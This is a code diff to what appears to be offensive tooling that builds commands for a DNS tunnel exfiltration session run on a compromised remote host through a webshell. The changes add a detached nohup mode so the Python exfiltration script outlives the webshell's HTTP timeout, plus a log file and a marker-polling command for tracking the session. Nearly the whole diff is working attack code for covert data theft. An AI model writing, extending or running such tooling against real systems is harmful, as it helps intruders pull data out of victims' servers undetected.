@@ -248,6 +248,20 @@ def dns_query_command(
     return command
 
 
+def dns_tunnel_session_log_path(marker_output_path: str) -> str:
+    """Companion log path for a detached DNS tunnel session."""
+    return f"{marker_output_path}.log"
+
+
+def dns_tunnel_session_poll_done_command(marker_output_path: str) -> str:
+    """Return a short remote command that prints 1 when SESSION_DONE is present."""
+    path = shlex.quote(marker_output_path)
+    # Count marker only — must not use ``|| true`` so callers can parse stdout.
+    return wrap_remote_shell_command(
+        f"grep -c DNS_TUNNEL_SESSION_DONE {path} 2>/dev/null || echo 0"
+    )
+
+
 def dns_tunnel_session_command(
     target: str,
     *,
@@ -259,8 +273,14 @@ def dns_tunnel_session_command(
     suppress_errors: bool = True,
     max_chunks: int | None = None,
     marker_output_path: str = "/tmp/.dsp-dns-tunnel.sent",
+    background: bool = True,
 ) -> str:
-    """Run full DNS tunnel exfil session on remote host — sendto only, no DNS recv."""
+    """Run full DNS tunnel exfil session on remote host — sendto only, no DNS recv.
+
+    When ``background`` is True (webshell default), the Python session is started
+    with ``nohup`` so the HTTP request returns immediately. Callers must poll
+    ``dns_tunnel_session_poll_done_command`` until SESSION_DONE, then cat markers.
+    """
     max_chunks_literal = "None" if max_chunks is None else str(int(max_chunks))
     script = (
         "import base64\n"
@@ -335,7 +355,17 @@ def dns_tunnel_session_command(
         "    mh.write(\"DNS_TUNNEL_SESSION_DONE\\n\")\n"
     )
     inner = _python3_b64_exec_command(script)
-    pipeline = f"rm -f {shlex.quote(marker_output_path)}; {inner}"
+    marker_q = shlex.quote(marker_output_path)
+    if background:
+        log_q = shlex.quote(dns_tunnel_session_log_path(marker_output_path))
+        # Detach so webshell HTTP (~30s servlet envelopes) cannot truncate the session.
+        pipeline = (
+            f"rm -f {marker_q} {log_q}; "
+            f"nohup {inner} >{log_q} 2>&1 </dev/null & "
+            f"echo DNS_TUNNEL_LAUNCHED:$!"
+        )
+        return wrap_remote_shell_command(pipeline)
+    pipeline = f"rm -f {marker_q}; {inner}"
     command = wrap_remote_shell_command(pipeline)
     if suppress_errors:
         return f"{command} 2>/dev/null || true"
@@ -367,12 +397,15 @@ def dns_tunnel_session_command_evidence(
         suppress_errors=suppress_errors,
         max_chunks=max_chunks,
         marker_output_path=marker_path,
+        background=True,
     )
     return {
         "dns_query_method": DNS_QUERY_METHOD,
         "remote_command": command,
-        "execution_mode": "dns_tunnel_session",
+        "poll_done_command": dns_tunnel_session_poll_done_command(marker_path),
+        "execution_mode": "dns_tunnel_session_detached",
         "marker_output_path": marker_path,
+        "session_log_path": dns_tunnel_session_log_path(marker_path),
         "max_chunks": max_chunks,
     }
 
